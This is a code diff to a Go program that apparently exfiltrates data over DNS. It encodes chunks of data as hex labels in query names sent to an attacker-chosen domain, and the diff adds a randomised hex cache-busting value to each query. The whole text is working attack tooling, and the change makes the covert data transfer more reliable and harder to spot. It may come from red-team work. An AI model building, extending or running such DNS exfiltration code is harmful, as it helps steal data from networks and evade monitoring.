@@ -13,6 +13,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/tls"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"flag"
@@ -51,7 +52,11 @@ const (
 
 var (
 	// COUNTER is used to prevent caching
-	COUNTER = uint64(0)
+	COUNTER uint64
+
+	// COUNTERRAND generates the cachebusting value randomly, using COUNTER
+	// as the length.
+	COUNTERRAND bool
 
 	/* query makes a request for the label in o, of the given type t ("t"
 	or "o"), for the given ID, to the given name.  len bytes will be
@@ -111,6 +116,11 @@ func main() {
 			rand.Uint64(),
 			"Start cache-busting counter at `N`",
 		)
+		counterRand = flag.Uint64(
+			"random-cachebust-length",
+			0,
+			"Use a random cachebusing value of `N` hex characters",
+		)
 		defang = flag.Bool(
 			"defang",
 			false,
@@ -145,7 +155,12 @@ Options:
 	}
 	flag.Parse()
 
+	/* Work out cachebusting */
 	COUNTER = *counterStart
+	if 0 != *counterRand {
+		COUNTERRAND = true
+		COUNTER = *counterRand
+	}
 
 	/* Make sure jitter is in the right range */
 	if 0 > *jitter || 1 < *jitter {
@@ -379,15 +394,42 @@ func createQueries(o []byte, t, id, domain string, exfilLen int) []string {
 		qs = append(qs, fmt.Sprintf(
 			"%02x.%v.%v.%v.%v",
 			o[start:end],
-			COUNTER,
+			cacheBuster(),
 			t,
 			id,
 			domain,
 		))
-		COUNTER++
 	}
 
 	return qs
+}
+
+var cbbuf []byte
+
+/* cacheBuster returns a string used to bust caches */
+func cacheBuster() string {
+	/* Just a number is easy */
+	if !COUNTERRAND {
+		s := fmt.Sprintf("%d", COUNTER)
+		COUNTER++
+		return s
+	}
+
+	/* Make sure we have a buffer */
+	if nil == cbbuf {
+		cbbuf = make([]byte, COUNTER/2+1)
+	}
+
+	/* Generate a random number */
+	n, err := rand.Read(cbbuf)
+	if nil != err { /* Should never happen */
+		panic(err)
+	}
+	if n != len(cbbuf) { /* Should never happen */
+		log.Panicf("short rand read %v < %v", n, len(cbbuf))
+	}
+
+	return hex.EncodeToString(cbbuf)[:COUNTER]
 }
 
 /* queryDNS sends off the contents of b in exfilLen-size chunks */
